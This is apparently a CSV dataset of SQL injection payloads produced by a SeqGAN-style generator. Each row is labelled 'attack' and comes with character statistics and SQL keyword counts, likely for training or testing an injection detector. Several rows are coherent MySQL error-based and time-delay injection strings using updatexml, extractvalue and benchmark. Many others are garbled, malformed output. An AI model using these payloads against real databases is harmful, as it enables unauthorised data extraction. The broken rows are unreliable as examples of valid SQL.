label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'e%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1239,156.0,27.0,3.78109224678787,38.0,39.0,55.0,24.0,0.24358974358974358,0.25,0.3525641025641026,0.15384615384615385,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1# AND bnal  )  /  (  =  (  (  0x2e,md5  (  (  (  select   (  elt  (  elt  (  1808  =  3393,  (  (  benchmark  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  casea   end  (  (   (  9393  (  (  elt    (  (  (  0x5c,0x7171706a71,  (  (  select   (  (  elta  elt  (  1808  =  (  (  3393  =  0x7171706a71(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1240,319.0,33.0,3.553682737385337,77.0,66.0,129.0,47.0,0.2413793103448276,0.20689655172413793,0.4043887147335423,0.14733542319749215,0.0,0.0,0.0,1.0,0.0,4.0,0.0,34.0,0.0,0.0,7.0,5.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%k8277""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1241,170.0,30.0,3.7817982073014598,38.0,43.0,63.0,26.0,0.2235294117647059,0.2529411764705882,0.37058823529411766,0.15294117647058825,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1242,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     extractvalue  (  (  9627,concat  (  (  (  (  (  (  (  (  =  (  (  (  (  (  2917  (  (  0x5c,  (  0x5c,0x7171706a71,md5  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  1297  =  (  3393,1   )    (  extractvalue  (  9627,md5  =  (  (  7982  =  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1243,363.0,33.0,3.613417692961247,79.0,85.0,139.0,60.0,0.21763085399449036,0.23415977961432508,0.38292011019283745,0.1652892561983471,0.0,1.0,0.0,0.0,0.0,4.0,0.0,42.0,1.0,0.0,12.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1244,18.0,5.0,2.016875695766564,0.0,1.0,8.0,9.0,0.0,0.05555555555555555,0.4444444444444444,0.5,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""   )    (  extractvalue  (  9627,md5  (  (  0x5c,0x7171706a71,  (  select   (  (  el  (  case  =  4688  (  1808,concat  (  (  (  (  0x5c,  (  (  select   (  (  e    (  case   ual adonadede   (  3681  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x4b774c75   end  (  =  (  5433  =  3393,1   )    )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1245,356.0,32.0,3.6904917762529204,99.0,72.0,137.0,48.0,0.27808988764044945,0.20224719101123595,0.3848314606741573,0.1348314606741573,0.0,1.0,0.0,0.0,0.0,3.0,0.0,33.0,1.0,0.0,10.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1246,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1247,165.0,28.0,3.661125294687482,40.0,35.0,65.0,25.0,0.24242424242424243,0.21212121212121213,0.3939393939393939,0.15151515151515152,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"select   (  )  case when   (  9103  =  4774  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  6212  (  1297,1   or  extractvalue  (  (  9627  =  (  benchmark  (  3393,1   )    (  extractvalue  (  (  9255,concat  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  select   (  elt  (  2162  )  1808  =  (  (  1 as anal  )  1808  =  (  3393,1",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1248,369.0,33.0,3.830344767463843,100.0,86.0,137.0,46.0,0.27100271002710025,0.23306233062330622,0.3712737127371274,0.12466124661246612,0.0,0.0,0.0,0.0,0.0,5.0,0.0,32.0,0.0,0.0,9.0,5.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1249,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1250,166.0,27.0,3.676378465202563,36.0,40.0,63.0,27.0,0.21686746987951808,0.24096385542168675,0.3795180722891566,0.16265060240963855,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,3.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,",(  (  (  (  =  (  (  (  end  (  (  1808,concat  (  (  (  0x5c,(  =  (  7982,concat  (  (  (  (  1 extractvalue  (  7982,1   )    USR$whenerodea  e  case when   (  5704  (  (  0x5c,0x7171706a71,  (  select   (  (  5000000  (  (  1297,  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  3393  (  0x2e,0x7171706a71,  (  =  (  3393,1   )    )  extractvalue  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1251,359.0,37.0,3.747608434214386,95.0,71.0,136.0,57.0,0.2646239554317549,0.1977715877437326,0.3788300835654596,0.15877437325905291,0.0,0.0,0.0,0.0,0.0,3.0,0.0,42.0,0.0,0.0,11.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%py nvgznnzly  0x4b774c75)      )    (  (  extractvalue  (  (  1049  )  (  =  (  (  (  3393,concat' like '  (  5777  (  (  7982  =  (  0x5c,0x7171706a71,1   from dua  elt  (  elt  (  3393  =  3393,1   (  (  elt  (  2917  =  (  3393,  (  (  7982  =  (  (  (  0x2e,concat  (  (  select   (  elt  (  elt  (  1808  =  1808,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1252,475.0,40.0,3.81357353515996,112.0,106.0,188.0,69.0,0.23578947368421052,0.2231578947368421,0.3957894736842105,0.14526315789473684,2.0,2.0,0.0,0.0,0.0,7.0,0.0,43.0,2.0,0.0,13.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1253,165.0,28.0,3.6987873444044377,36.0,39.0,63.0,27.0,0.21818181818181817,0.23636363636363636,0.38181818181818183,0.16363636363636364,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,3.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     )  extractvalue  (  (  (  (  (  (  9627,concat  (  (  (  (  3393,  (  benchmark  (  2917=  (  9627,concat  (  (  (  1 or extractvalue  (  (   from dual  )  e  =  (  1808,1   )    (  extractvalue  (  2917,md5  (  (  0x5c,  (  (  benchmark  (  (  5000000(  (  0x5c,  (  0x2e,0x7171706a71,  (  1049  (  5000000,md5  (  (  (  0x2e,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1254,350.0,34.0,3.7311178580414563,93.0,66.0,135.0,56.0,0.26571428571428574,0.18857142857142858,0.38571428571428573,0.16,0.0,1.0,0.0,0.0,0.0,2.0,0.0,41.0,1.0,0.0,11.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1255,164.0,28.0,3.68445221180306,36.0,39.0,63.0,26.0,0.21951219512195122,0.23780487804878048,0.38414634146341464,0.15853658536585366,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    (  extractvalue  (  8862,1extractvalue  (  (  (  (  (  (  (  (  0x2e,0x7171706a71(  (  (  0x2e,0x7171706a71,  (  (  select   (  7982  =  (  (  3393,1   from d5  (  9667  )  (  (  (  select   (  elt  (  0x4b774c75   end  (  elt  (  elt  e  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1256,367.0,35.0,3.7198897166349427,93.0,87.0,135.0,52.0,0.25340599455040874,0.23705722070844687,0.3678474114441417,0.14168937329700274,0.0,1.0,0.0,0.0,0.0,2.0,0.0,38.0,1.0,0.0,10.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'knnA"" like """" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""WHERE1802' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1257,455.0,36.0,3.9591838584781462,122.0,119.0,155.0,59.0,0.2681318681318681,0.26153846153846155,0.34065934065934067,0.12967032967032968,4.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,0.0,0.0,18.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1258,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   (  )    extractvalue  (  (  (  (  (  (  (  (  7982  (  (  (  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  =  (  9627,concat  (  (  (  =  extractvalue  (  (  benchmark  (  5000000(  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  )   (  (  elt  (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1259,348.0,33.0,3.561113426213933,84.0,67.0,135.0,62.0,0.2413793103448276,0.1925287356321839,0.3879310344827586,0.1781609195402299,0.0,1.0,0.0,0.0,0.0,2.0,0.0,48.0,1.0,0.0,10.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1260,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1261,165.0,29.0,3.685367718929906,40.0,35.0,65.0,25.0,0.24242424242424243,0.21212121212121213,0.3939393939393939,0.15151515151515152,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1262,164.0,28.0,3.68445221180306,36.0,39.0,63.0,26.0,0.21951219512195122,0.23780487804878048,0.38414634146341464,0.15853658536585366,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  "" %'  =  'k0x717a767a71' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '1802el  (  1297  =  (  (  3393,1   )    )    (  2162  =  1  (  US,updatexml_(  (   (    (  (  eltalt  elt  (  1297  =  (  1808,1   )    AND AND when d5  (  0x2e,0x7171706a71,0x7171706a71,  (  (  5000000,md5  (  (  select   (  elt  3393  =  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  3393,1   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1263,782.0,42.0,3.81890657957382,182.0,199.0,295.0,106.0,0.23273657289002558,0.2544757033248082,0.3772378516624041,0.13554987212276215,4.0,4.0,0.0,0.0,0.0,9.0,0.0,60.0,2.0,1.0,26.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,0.0,5.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1264,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1265,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,0.0,4.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
